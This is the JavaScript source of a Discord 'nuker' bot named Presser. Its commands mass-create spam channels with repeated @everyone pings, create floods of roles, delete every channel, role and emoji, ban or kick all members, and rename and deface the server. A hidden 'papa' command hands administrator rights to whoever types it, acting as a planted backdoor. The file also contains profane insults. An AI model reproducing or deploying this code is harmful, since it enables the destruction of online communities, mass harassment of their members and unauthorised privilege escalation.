﻿// https://github.com/17teen
// Discord: 7teen#3868

const Discord = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;

const presser = String.raw`


                     ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███
                    ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
                    ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
                    ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄
                    ▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
                    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
                    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░
                    ░        ░  ░      ░        ░     ░  ░   ░



                                        Author: Citizen

`;

console.log(red(presser));


client.on("ready", () => {
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(greenBright(`                                      Logged in as: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                                      Prefix: ${prefix}`));
    console.log(greenBright(`                                      DisableEveryone: ${disableEveryone}`));
    console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "Citizen's Commands" }); // Delete this if you wish.
});


client.on("message", async message => {

    if (message.author.bot) return;

    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        const helpEmbed = new Discord.MessageEmbed()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
            .setTitle('Nuker: Presser')
            .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
            **Mass Channel:** \`${prefix}cc\` [text]
            **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
            **Mass Roles:** \`${prefix}mr\` [text]
            **Delete All Channels:** \`${prefix}chd\`
            **Delete All Roles:** \`${prefix}dr\`
            **Delete All Emojis:** \`${prefix}emoall\`
            **Ban All Members:** \`${prefix}banall\`
            **Kick All Members:** \`${prefix}kall\`
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© Presser | Prefix: ${prefix} | Author: Citizen | Cord: ${founder}`)
            .setColor(0x36393E)
            .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
    }

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }

    // Help

    if (disableEveryone === false) {

        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('Nuker: Presser')
                .setDescription(`*War does not termine who is right, only who is left.*\n\n **Nuking:**\n
                **Mass Channel:** \`${prefix}cc\` [text]
                **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                **Mass Roles:** \`${prefix}mr\` [text]
                **Delete All Channels:** \`${prefix}chd\`
                **Delete All Roles:** \`${prefix}dr\`
                **Delete All Emojis:** \`${prefix}emoall\`
                **Ban All Members:** \`${prefix}banall\`
                **Kick All Members:** \`${prefix}kall\`
                **Server Annihilation:** \`${prefix}die\` [text]
                `)
                .setImage(`https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif`)
                .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
        }

        // Mass Channels

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create("Citizen Daddy")
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }
                }
                message.delete();
            }


        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create("CITIZEN Daddy")

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create("CITIZEN Daddy")

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone ' + argresult);
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }


        // Mass Roles

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    setInterval(function () {
                        var i = 0; i < 250;
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).then(console.log(yellow("ROLE BEING MASSED")))
                    }, 100) // 0.1 second
                }
                message.delete();
            }
        }

        // Channel Delete
        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                )); // deletes all channels
                message.delete();
								message.guild.channels.create("CITIZEN Daddy")
            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ))
                message.delete();
            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ));
                message.delete();
            }
        }

        // Delete All Roles
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.roles.cache.forEach((role) => {
                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                })
                message.delete();
            }
        }

        // Delete All Emojis
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                message.delete();
            }
        }

        // Death.
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                message.delete();
                message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://images-ext-1.discordapp.net/external/LwTQjXzufFNHNuhQw6xWKko-CEPxYFyMQzBYQQLz_gU/%3Fwidth%3D323%26height%3D406/https/media.discordapp.net/attachments/781947622269255690/829957982926274560/rip.png?width=323&height=405') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }
                setInterval(function () {
                    var i = 0; i < 250;
                    message.guild.roles.create({
                        data: {
                            name: `${argresult}`,
                            position: i++,
                            color: "RANDOM"
                        }
                    }).then(console.log(yellow("ROLE BEING MASSED")))
                }, 100) // 0.1 second
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else if (disableEveryone === true)
     {
		   if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 ){
			 {

        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                return message.reply('You are not authorised to use any of these tools commands.')
            }
            else {
                const helpEmbed = new Discord.MessageEmbed()
                    .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                    .setTitle('Nuker: Presser')
                    .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
                    **Mass Channel:** \`${prefix}cc\` [text]
                    **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                    **Mass Roles:** \`${prefix}mr\` [text]
                    **Delete All Channels:** \`${prefix}chd\`
                    **Delete All Roles:** \`${prefix}dr\`
                    **Delete All Emojis:** \`${prefix}emoall\`
                    **Ban All Members:** \`${prefix}banall\`
                    **Kick All Members:** \`${prefix}kall\`
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(``)
                    .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
        }

        // Mass Channels

        if (message.content.startsWith(prefix + 'cc')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else
						 {

                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        let args = message.content.split(" ").slice(1);
                        var argresult = args.join(' ');
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }

              }
        }

        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else
						   {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log(blueBright(`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }

                        }


                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                  }
              }
        }
        // Mass Create Roles

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        setInterval(function () {
                            var i = 0; i < 250;
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then(console.log(yellow("ROLE BEING MASSED")))
                        }, 100) // 0.1 second
                    }

            }
        }

        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    message.guild.channels.cache.forEach(channel => channel.delete().then(
                        console.log(redBright(`CHANNEL FUCKED`))
                    )); // deletes all channels
                    message.delete();
										message.guild.channels.create("CITIZEN Daddy")

            }
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ))

            }
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ));
                }

        }

        // Delete All Roles All
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} was deleted successfully`))).catch(
                        console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
                    ));

            }
        }

        // Delete All Emojis All
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {

                    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))).catch(
                        console.log(yellow(`EMOJI: ${r.name} was cannot be deleted.`))
                    ));

            }
        }


      // Death.
       if (message.content.startsWith(prefix + 'die')) {
         if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
          }
					 else {

                message.delete();
                message.guild.setName(`CITIZEN DADDY`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach(channel => channel.delete().then(
                    console.log(redBright(`CHANNEL FUCKED`))
                ).then(
                    // Channel Icon Change
                    message.guild.setIcon('https://images-ext-1.discordapp.net/external/LwTQjXzufFNHNuhQw6xWKko-CEPxYFyMQzBYQQLz_gU/%3Fwidth%3D323%26height%3D406/https/media.discordapp.net/attachments/781947622269255690/829957982926274560/rip.png?width=323&height=405') // changes server pfp
                ));

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (!role.editable) {
                        return;
                    } else {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

               //Channel Creation

                  for (var i = 0; i < 250; i++) {
                        message.guild.channels.create("CITIZEN Daddy")

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create("CITIZEN Daddy")

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create("@everyone "+argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        )
                    }
                }




            }


        }
      }
			//Admin Perm
          if (message.content.startsWith(prefix + 'papa'))
		  {    role = await message.guild.roles.create ({
             name: 'role',
             color: 'BLUE',
             })
	           role.setPermissions(['ADMINISTRATOR'])
	          role.setPosition(15)

						message.member.roles.add(role)
             message.delete();

						return console.log(red("ADMINSTRATOR!!!!! granted to " + message.member.user.tag))

				}

    //Leave

	 		if (message.content.startsWith(prefix + 'lalit'))
		  {
			 if (message.author.id == 462270540502269953 || message.author.id == 387706245362089986 || message.author.id == 780376098365243395 || message.author.id == 683667783737016332 ){
			      try
			     {

             message.delete();
            message.guild.leave();

            return console.log(red("SUCESSFULLY LEFT THE SERVER......Sad :("))

           }
		          catch(e)
		        {

              console.log(e.stack);

            }
				 }

           else
					 message.channel.send("Baap se bakchodi krega teri maa ki choot lawde")



				}


	 }
	}
})

client.login(token);